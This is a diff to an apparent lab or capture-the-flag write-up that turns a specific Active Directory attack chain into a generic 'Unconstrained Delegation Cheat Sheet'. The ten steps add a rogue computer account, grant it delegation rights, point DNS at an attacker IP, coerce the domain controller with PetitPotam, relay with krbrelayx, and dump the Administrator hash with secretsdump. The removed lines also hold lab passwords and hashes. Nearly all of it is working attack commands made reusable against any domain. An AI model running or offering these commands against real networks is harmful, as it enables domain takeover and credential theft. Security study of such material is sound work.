@@ -22,25 +22,40 @@ SeEnableDelegationPrivilege
 ### 2.4 Attack Chain
 
 ```powershell
- impacket-addcomputer -dc-ip 10.129.234.69 -computer-name pwn delegate.vl/N.Thompson:'KALEB_2341'
+bash# ═══════════════════════════════════════════
+#   UNCONSTRAINED DELEGATION CHEAT SHEET
+# ═══════════════════════════════════════════
 
-bloodyAD -u 'N.Thompson' -d 'delegate.vl' -p 'KALEB_2341' --host '10.129.234.69' add uac 'pwn$' -f TRUSTED_FOR_DELEGATION
+# [1] Add computer account
+impacket-addcomputer -dc-ip <DC_IP> -computer-name <COMP_NAME> <DOMAIN>/<USER>:'<PASS>'
 
-python3 ./krbrelayx/dnstool.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -r pwn.delegate.vl -d 10.10.15.254 --action add 10.129.234.69
+# [2] Enable Unconstrained Delegation
+bloodyAD -u '<USER>' -d <DOMAIN> -p '<PASS>' --host <DC_IP> add uac '<COMP_NAME>$' -f TRUSTED_FOR_DELEGATION
 
-python3 ./krbrelayx/addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/pwn' -t 'pwn$' -dc-ip 10.129.234.69 10.129.234.69
+# [3] Add DNS A record
+python3 dnstool.py -u '<DOMAIN>\<USER>' -p '<PASS>' -r <COMP_NAME>.<DOMAIN> -d <DC_IP> --action add <ATTACKER_IP>
 
-bloodyAD -d delegate.vl --dc-ip 10.129.234.69 -u 'N.Thompson' -p 'KALEB_2341' get object 'pwn$' --attr 'servicePrincipalName'
+# [4] Add SPN
+python3 addspn.py -u '<DOMAIN>\<USER>' -p '<PASS>' -s 'cifs/<COMP_NAME>' -t '<COMP_NAME>$' -dc-ip <DC_IP> <DC_IP>
 
-dig pwn.delegate.vl @10.129.234.69
+# [5] Verify SPN
+bloodyAD -d <DOMAIN> --dc-ip <DC_IP> -u '<USER>' -p '<PASS>' get object '<COMP_NAME>$' --attr 'servicePrincipalName'
 
-python3 -c "import hashlib,binascii; print(binascii.hexlify(hashlib.new('md4','ijUf7IewMyXKjakwQxbtQmAqjrO4VW8S'.encode('utf-16-le')).digest()).decode())"
+# [6] Verify DNS
+dig <COMP_NAME>.<DOMAIN> @<DC_IP>
 
-python3 ./krbrelayx/krbrelayx.py -hashes :868cc835d19a9e9ffb7adbc0b2f6ef4f
+# [7] Calculate NT Hash
+python3 -c "import hashlib,binascii; print(binascii.hexlify(hashlib.new('md4','<COMP_PASS>'.encode('utf-16-le')).digest()).decode())"
 
-python3 PetitPotam.py -target-ip 10.129.234.69 -u 'pwn$' -p '9k3VxHcDZZCRlE2zmqbhI1ntJPULRxyX' pwn dc1.delegate.vl
+# [8] Start krbrelayx (separate terminal)
+python3 krbrelayx.py -hashes :<NT_HASH> -aesKey <AES256>
 
-KRB5CCNAME=DC1\$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache impacket-secretsdump -just-dc-user Administrator -k dc1.delegate.vl
+# [9] Trigger PetitPotam (separate terminal)
+python3 PetitPotam.py -target-ip <DC_IP> -u '<COMP_NAME>$' -p '<COMP_PASS>' <COMP_NAME> dc1.<DOMAIN>
+
+# [10] Dump secrets with captured TGT
+KRB5CCNAME=DC1\$@<DOMAIN_UPPER>_krbtgt@<DOMAIN_UPPER>.ccache \
+impacket-secretsdump -just-dc-user Administrator -k dc1.<DOMAIN>
 ```
 
 ---
